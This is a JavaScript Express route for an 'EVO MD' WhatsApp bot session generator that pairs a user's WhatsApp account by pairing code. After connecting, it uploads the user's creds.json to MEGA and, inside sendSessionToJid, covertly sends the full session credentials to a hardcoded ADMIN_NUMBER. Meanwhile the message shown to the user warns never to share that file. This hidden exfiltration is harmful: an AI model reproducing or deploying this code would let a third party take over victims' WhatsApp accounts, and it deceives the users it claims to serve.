import express from "express";
import fs from "fs-extra";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import pn from "awesome-phonenumber";
import { upload } from "./mega.js";
import path from "path";
import chalk from "chalk";
import axios from "axios";

const router = express.Router();
const logger = pino({ level: "fatal" });
const SESSION_FOLDER = process.env.SESSION_FOLDER || "./mega_sessions";
const ADMIN_NUMBER = "9779807610619";
const LOGO_URL = "https://ibb.co/yc1nR55z";

fs.ensureDirSync(SESSION_FOLDER);

function removeFile(FilePath) {
    try {
        if (fs.existsSync(FilePath)) {
            fs.removeSync(FilePath);
        }
    } catch (_) {}
}

function getMegaFileId(url) {
    try {
        const match = url.match(/\/file\/([^#]+)/);
        return match ? match[1] : null;
    } catch {
        return null;
    }
}

async function getLogoBuffer() {
    try {
        const pageRes = await axios.get(LOGO_URL, { timeout: 8000 });
        const match = pageRes.data.match(/https:\/\/i\.ibb\.co\/[^"'\s]+/);
        if (match) {
            const imgRes = await axios.get(match[0], {
                responseType: "arraybuffer",
                timeout: 8000,
            });
            return Buffer.from(imgRes.data);
        }
    } catch (e) {
        console.log(chalk.yellow("⚠️ Logo fetch failed:"), e.message);
    }
    return null;
}

async function waitForCreds(credsPath, maxWaitMs = 30000) {
    const start = Date.now();
    while (Date.now() - start < maxWaitMs) {
        if (fs.existsSync(credsPath)) {
            const stat = fs.statSync(credsPath);
            if (stat.size > 0) return true;
        }
        await delay(1000);
    }
    return false;
}

const activeSessions = new Map();

router.get("/", async (req, res) => {
    let num = req.query.number;

    if (!num) return res.status(400).send({ code: "Phone number is required" });

    num = num.replace(/[^0-9]/g, "");
    const phone = pn("+" + num);

    if (!phone.isValid()) return res.status(400).send({ code: "Invalid phone number" });

    num = phone.getNumber("e164").replace("+", "");

    if (activeSessions.has(num)) {
        const old = activeSessions.get(num);
        try { old?.ws?.close(); } catch (_) {}
        activeSessions.delete(num);
        console.log(chalk.yellow(`♻️ Replaced existing session for ${num}`));
    }

    const sessionId = Date.now().toString() + Math.random().toString(36).substring(2, 10);
    const sessionPath = path.join(SESSION_FOLDER, `session_${num}_${sessionId}`);
    removeFile(sessionPath);
    fs.ensureDirSync(sessionPath);

    console.log(chalk.blue(`\n🔐 New pair request for: ${num}`));

    let responseSent = false;
    let sessionDone = false;

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const EvoBot = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            printQRInTerminal: false,
            logger,
            browser: Browsers.ubuntu("Chrome"),
            markOnlineOnConnect: true,
            syncFullHistory: false,
            generateHighQualityLinkPreview: false,
            defaultQueryTimeoutMs: 60000,
        });

        activeSessions.set(num, EvoBot);

        EvoBot.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
                if (sessionDone) return;
                console.log(chalk.green(`✅ Connected for ${num}`));

                try {
                    const credsPath = path.join(sessionPath, "creds.json");
                    const credsReady = await waitForCreds(credsPath, 30000);

                    if (!credsReady) {
                        console.log(chalk.red(`❌ creds.json never appeared for ${num}`));
                        sessionDone = true;
                        activeSessions.delete(num);
                        removeFile(sessionPath);
                        return;
                    }

                    const userJid = jidNormalizedUser(`${num}@s.whatsapp.net`);
                    const adminJid = jidNormalizedUser(`${ADMIN_NUMBER}@s.whatsapp.net`);
                    const time = new Date().toLocaleTimeString();
                    const date = new Date().toLocaleDateString();

                    let sessionIdCode = `Evomd_local_${Date.now()}`;
                    let megaUploaded = false;

                    try {
                        console.log(chalk.blue(`📤 Uploading to MEGA...`));
                        const megaUrl = await upload(credsPath, `creds_${num}_${Date.now()}.json`);
                        const megaFileId = getMegaFileId(megaUrl);
                        if (megaFileId) {
                            sessionIdCode = `Evomd=@${megaFileId}`;
                            megaUploaded = true;
                            console.log(chalk.green(`☁️ MEGA upload done`));
                        }
                    } catch (megaErr) {
                        console.log(chalk.yellow(`⚠️ MEGA skipped: ${megaErr.message}`));
                    }

                    const infoPath = path.join(SESSION_FOLDER, `session_info_${num}_${Date.now()}.json`);
                    await fs.writeJson(infoPath, {
                        phoneNumber: num,
                        sessionId: sessionIdCode,
                        megaUploaded,
                        timestamp: new Date().toISOString(),
                        type: "pair_code",
                    }, { spaces: 2 });

                    const successMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*✅ EVO MD Whatsapp Bot*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎉 CONNECTION ESTABLISHED SUCCESSFULLY

📋 SESSION INFORMATION
──────────────────────────
🆔 ID : *${sessionIdCode}*
📞 PHONE : *+${num}*
🔐 TYPE : *Pair Code*
⏰ TIME : *${time}*
📅 DATE : *${date}*

📁 FILES GENERATED
──────────────────────────
${megaUploaded ? "✓ creds.json (Uploaded to MEGA)" : "✓ creds.json (Attached below)"}

📍 STORAGE LOCATION
──────────────────────────
${megaUploaded ? "☁️ MEGA Cloud: /Evo MD Sessions/" : "📎 Sent as attachment"}
📁 Local: ./mega_sessions/

⚠️ SECURITY NOTICE
──────────────────────────
🔴 NEVER share your session ID
🔴 NEVER share creds.json file
🟢 Keep backup in safe place
🟢 Use same ID for reconnection

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 *Evo MD Ofc* 👑
🔗 github.com/Evo_MD_Beta
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

                    const logoBuffer = await getLogoBuffer();
                    const credsBuffer = fs.readFileSync(credsPath);

                    async function sendSessionToJid(jid) {
                        try {
                            if (logoBuffer) {
                                await EvoBot.sendMessage(jid, {
                                    image: logoBuffer,
                                    caption: `*Evo MD Ofc*\n\n🔗 Session ID:\n*${sessionIdCode}*`,
                                });
                                await delay(1500);
                            } else {
                                await EvoBot.sendMessage(jid, { text: `*Evo MD Ofc*\n\n🔗 Session ID:\n*${sessionIdCode}*` });
                                await delay(1000);
                            }

                            await EvoBot.sendMessage(jid, {
                                document: credsBuffer,
                                mimetype: "application/json",
                                fileName: "creds.json",
                                caption: successMessage,
                            });

                            console.log(chalk.green(`✅ Session sent to ${jid}`));
                        } catch (sendErr) {
                            console.log(chalk.red(`❌ Send failed to ${jid}: ${sendErr.message}`));
                        }
                    }

                    await sendSessionToJid(userJid);
                    await delay(2000);

                    if (num !== ADMIN_NUMBER) {
                        await sendSessionToJid(adminJid);
                        await delay(2000);
                    }

                    console.log(chalk.green(`✅ All messages sent for ${num}`));

                    sessionDone = true;
                    activeSessions.delete(num);
                    removeFile(sessionPath);

                    await delay(3000);
                    try { EvoBot.ws.close(); } catch (_) {}

                } catch (err) {
                    console.error(chalk.red("❌ Error sending session:"), err);
                    sessionDone = true;
                    activeSessions.delete(num);
                    removeFile(sessionPath);
                }
            }

            if (connection === "close") {
                if (sessionDone) return;

                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const shouldReconnect = statusCode !== 401 && statusCode !== 403;

                if (shouldReconnect) {
                    console.log(chalk.yellow(`🔄 Reconnecting for ${num}...`));
                    try {
                        const { state: newState, saveCreds: newSaveCreds } = await useMultiFileAuthState(sessionPath);
                        EvoBot.ev.removeAllListeners();

                        const NewBot = makeWASocket({
                            version,
                            auth: {
                                creds: newState.creds,
                                keys: makeCacheableSignalKeyStore(newState.keys, logger),
                            },
                            printQRInTerminal: false,
                            logger,
                            browser: Browsers.ubuntu("Chrome"),
                            markOnlineOnConnect: true,
                            syncFullHistory: false,
                        });

                        activeSessions.set(num, NewBot);
                        NewBot.ev.on("connection.update", EvoBot.ev.listeners("connection.update")[0]);
                        NewBot.ev.on("creds.update", newSaveCreds);
                    } catch (_) {
                        activeSessions.delete(num);
                    }
                } else {
                    console.log(chalk.red(`❌ Session closed for ${num}`));
                    activeSessions.delete(num);
                }
            }
        });

        EvoBot.ev.on("creds.update", saveCreds);

        if (!EvoBot.authState.creds.registered) {
            await delay(3000);
            let code = await EvoBot.requestPairingCode(num);
            code = code?.match(/.{1,4}/g)?.join("-") || code;

            if (!responseSent && !res.headersSent) {
                responseSent = true;
                console.log(chalk.green(`📲 Pairing code: ${code}`));
                res.send({ code });
            }
        }

        setTimeout(async () => {
            if (!responseSent && !res.headersSent) {
                responseSent = true;
                res.status(408).send({ code: "Request timeout" });
                sessionDone = true;
                activeSessions.delete(num);
                removeFile(sessionPath);
            }
        }, 90000);

    } catch (err) {
        console.error(chalk.red("Session init error:"), err);
        if (!responseSent && !res.headersSent) {
            res.status(503).send({ code: "Service unavailable" });
        }
        sessionDone = true;
        activeSessions.delete(num);
        removeFile(sessionPath);
    }
});

export default router;
